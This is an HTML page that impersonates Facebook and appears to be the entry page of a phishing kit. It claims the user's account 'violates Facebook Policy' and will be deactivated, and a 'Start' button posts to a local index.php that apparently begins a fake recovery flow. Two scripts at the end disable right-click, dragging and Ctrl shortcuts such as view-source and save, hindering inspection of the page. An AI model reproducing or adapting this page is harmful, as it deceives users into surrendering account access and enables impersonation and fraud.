<html class="_9dls __fb-light-mode" lang="en">
    <head>
        <link rel="icon" type="image/png" href="img/icon.png">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2,shrink-to-fit=no">
        <link type="text/css" rel="stylesheet" href="css/style-m.css">
        <link type="text/css" rel="stylesheet" href="css/fL0gASD89fmhDS.css">

<title>User Safety</title>

</head>
<body class="_6s5d _71pn system-fonts--body segoe">
    <div id="mount_0_0_Qf" style="">
        <!--$--><span id="ssrb_root_start" style="display:none">
        </span><!--$--><div>
            <div class=""><!--$-->
                <form action="index.php?button_location=settings&amp;button_name=eligibility" method="POST">
                
                <div class="rq0escxv l9j0dhe7 du4w35lb">
                    <div class="rq0escxv du4w35lb q5bimw55 datstx6m d76ob5m9 eg9m0zos poy2od1o ofs802cu j9ispegn kr520xx4 k4urcfbm pohlnb88 dkue75c7 mb9wzai9" aria-hidden="true" id="scrollview" style="left: 0px;">
                        <div class="du4w35lb l9j0dhe7 cbu4d94t j83agx80">
                            <div class="j83agx80 cbu4d94t l9j0dhe7 jgljxmt5 be9z9djy"><!--$-->
                                <div class="tkr6xdv7 kr520xx4 j9ispegn poy2od1o n7fi1qx3">
                                    <div role="banner">
                                        <div class="ehxjyohh kr520xx4 j9ispegn poy2od1o dhix69tm byvelhso buofh1pr j83agx80 rq0escxv bp9cbjyn">
                                            <div aria-hidden="true" class="pmk7jnqg kp4lslxn lxek4yd6 ms05siws pnx7fd3z nf1dmkjp b5wmifdl hzruof5a">
                                                <div aria-disabled="true" aria-label="Kembali ke halaman sebelumnya." class="oajrlxb2 qu0x051f esr5mh6w e9989ue4 r7d6kgcz p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x i1ao9s8h esuyzwwr f1sip0of rj84mg9z abiwlrkh p8dawk7l lzcic4wl bp9cbjyn s45kfl79 emlxlaya bkmhp75w spb7xbtv rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv j83agx80 taijpn5t jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 qypqp5cg q676j6op c98fg2ug" role="button" tabindex="-1">
                                                    <i data-visualcompletion="css-img" class="hu5pjgll dfmqs5qf" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/C-IF1ZQl9kN.png');background-position:0 -46px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block">
                                                    </i>
                                                    <div class="i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s s45kfl79 emlxlaya bkmhp75w spb7xbtv" data-visualcompletion="ignore">

                                                    </div>
                                                </div>
                                            </div>
                                            <a aria-label="Facebook" class="oajrlxb2 gs1a9yip g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 mg4g778l pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb n00je7tq arfg74bv qs9ysxi8 k77z8yql btwxx1t3 abiwlrkh p8dawk7l q9uorilb lzcic4wl pedkr2u6 ms05siws pnx7fd3z nf1dmkjp" href="/" role="link" tabindex="0">
                                                <svg viewBox="0 0 36 36" class="a8c37x1j ms05siws l3qrxjdp b7h9ocf4" fill="url(#jsc_s_2)" height="40" width="40">
                                                    <defs>
                                                        <linearGradient x1="50%" x2="50%" y1="97.0782153%" y2="0%" id="jsc_s_2">
                                                            <stop offset="0%" stop-color="#0062E0"></stop><stop offset="100%" stop-color="#19AFFF"></stop>
                                                        </linearGradient>
                                                    </defs>
                                                    <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
                                                    <path class="p361ku9c" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"></path>
                                                </svg>
                                            </a>
                                            <div>
                                                <div>

                                                </div>
                                            </div>
                                        </div>
                                        <div class="rq0escxv l9j0dhe7 du4w35lb cddn0xzi j83agx80 cbu4d94t byvelhso">
                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t bkfpd7mw">

                                            </div>
                                            <div class="rq0escxv du4w35lb rozst971 g3xnvtyb p1jhd9yy a0vgkybk n7fi1qx3 ooasylqa hzruof5a pmk7jnqg j9ispegn">

                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="rq0escxv l9j0dhe7 du4w35lb">
                                    <div class="du4w35lb l9j0dhe7 cbu4d94t j83agx80">
                                        <div class="j83agx80 cbu4d94t l9j0dhe7 jgljxmt5 be9z9djy">
                                            <div class="dp1hu0rb d2edcug0 taijpn5t j83agx80 gs1a9yip">
                                                <div class="k4urcfbm dp1hu0rb d2edcug0 cbu4d94t j83agx80 bp9cbjyn" role="main">
                                                    <div class="bp9cbjyn j83agx80 cbu4d94t l9j0dhe7 k4urcfbm du4w35lb">
                                                        <div class="k4urcfbm ji3y4fs9">
                                                            <div class="j83agx80 l9j0dhe7 k4urcfbm">
                                                                <div class="rq0escxv l9j0dhe7 du4w35lb hybvsw6c io0zqebd m5lcvass fbipl8qg nwvqtn77 k4urcfbm ni8dbmo4 stjgntxs sbcfpzgs" style="border-radius: max(0px, min(8px, ((100vw - 4px) - 100%) * 9999)) / 8px;">
                                                                    <div class="tojvnm2t a6sixzi8 k5wvi7nf q3lfd5jv pk4s997a bipmatt0 cebpdrjk qowsmv63 owwhemhu dp1hu0rb dhp61c6y l9j0dhe7 iyyx5f41 a8s20v7p">
                        <div>
                            <div>
                                <div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0">
                                    <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo">
                                        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0">
                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw i1fnvgqd gs1a9yip owycx6da btwxx1t3 hv4rvrfc dati1w0a discj3wi">
                                                <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t d2edcug0 hpfvmrgz rj1gh0hx buofh1pr g5gj957u jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso">
                                                    <div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0 discj3wi ihqw7lf3">
                                                        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo sv5sfqaa obtkqiv7">
                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 bp9cbjyn aov4n071 bi6gxh9e">
                                                                <div class="l9j0dhe7">
                                                                    <img alt="" referrerpolicy="origin-when-cross-origin" src="img/gembok.png">
                                                                    <div class="cwj9ozl2 s45kfl79 emlxlaya bkmhp75w spb7xbtv tghqpdut linoseic ihtri3yf pby63qed e9o6kcyi pmk7jnqg joqnjd4g">

                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e discj3wi ihqw7lf3">
                                                                <div class="sv5sfqaa obtkqiv7 cbu4d94t j83agx80">
                                                                    <div class="aov4n071 bi6gxh9e">
                                                                        <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 qg6bub1s iv3no6db o0t2es00 f530mmz5 hnhda86s oo9gr5id oqcyycmt" dir="auto">Your Account Violates Facebook Policy</span>
                                                                    </div>
                                                                    <div class="aov4n071 bi6gxh9e">
                                                                        <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em mdeji52x a5q7v75 g1cxx5fr b1v8xokw oo9gr5id oqcyycmt" dir="auto">We noticed unusual activity in your account. Someone has reported your account for abuse and resulted in the account being disabled.</span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e">
                                                                <div class="ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi ni8dbmo4 stjgntxs ecm0bbzt ph5uu5jm b3onmgus ihqw7lf3 i94ygzvd">
                                                                    <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw i1fnvgqd bp9cbjyn owycx6da btwxx1t3 d1544ag0 tw6a2znq discj3wi b5q2rw42 lq239pai mysgfdmx hddg9phg">
                                                                        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 hpfvmrgz nqmvxvec p8fzw8mz pcp91wgn iuny7tx3 ipjc6fyt">
                                                                            <div class="muag1w35">
                                                                                <div class="s45kfl79 emlxlaya bkmhp75w spb7xbtv bp9cbjyn rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv pq6dq46d taijpn5t l9j0dhe7 nfl8ryma tv7at329 thwo4zme">
                                                                                    <i data-visualcompletion="css-img" class="hu5pjgll eb18blue" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/iCrKfMrN-jE.png&quot;); background-position: 0px -491px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;">
                                                                                    </i>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t d2edcug0 hpfvmrgz rj1gh0hx buofh1pr g5gj957u p8fzw8mz pcp91wgn iuny7tx3 ipjc6fyt">
                                                                            <div class="j83agx80 cbu4d94t ew0dbk1b irj2b8pg">
                                                                                <div class="qzhwtbm6 knvmm38d">
                                                                                    <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db a5q79mjw g1cxx5fr lrazzd5p oo9gr5id hzawbc8m" dir="auto">
                                                                                        <span class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7 ojkyduve" style="-webkit-box-orient: vertical; -webkit-line-clamp: 2; display: -webkit-box;">Account Alert! </span>
                                                                                    </span>
                                                                                </div>
                                                                                <div class="qzhwtbm6 knvmm38d">
                                                                                    <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain hzawbc8m" dir="auto">For security reasons, we will immediately deactivate your account if you ignore this warning.</span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e">
                                                                <div class="sjgh65i0 tr9rh885">
                                                                    <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v b1v8xokw oo9gr5id" dir="auto">We will walk you through several steps to cancel a deactivated account.</span>
                                                                </div>
                                                            </div>
                                                            <div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e">
                                                                <div aria-label="Mulai" class="oajrlxb2 g5ia77u1 qu0x051f esr5mh6w e9989ue4 r7d6kgcz nhd2j8a9 p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso i1ao9s8h esuyzwwr f1sip0of n00je7tq arfg74bv qs9ysxi8 k77z8yql abiwlrkh p8dawk7l lzcic4wl rq0escxv pq6dq46d cbu4d94t taijpn5t l9j0dhe7 k4urcfbm" role="button" tabindex="0">
                                                                    <button class="l9j0dhe7 du4w35lb j83agx80 pfnyh3mw taijpn5t bp9cbjyn owycx6da btwxx1t3 kt9q3ron ak7q8e6j isp2s0ed ri5dt5u2 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv d1544ag0 tw6a2znq s1i5eluu tv7at329" id="submit-btn" type="submit"><b>Start</b></button>
                                                                            </form>
                                                                            </div>
                                                                        </div>
                                                                        <div class="n00je7tq arfg74bv qs9ysxi8 k77z8yql i09qtzwb n7fi1qx3 b5wmifdl hzruof5a pmk7jnqg j9ispegn kr520xx4 c5ndavph art1omkt ot9fgl3s rnr61an3 sh2lq2h4 lzcic4wl" data-visualcompletion="ignore"></div>

                                                                        <script type="text/javascript">
                                                                                                                                            function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
                                                                                                                                            </script>
                                                                                                                                            <script type="text/javascript">
                                                                                                                                            window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
                                                                                                                                            </script>
</body></html>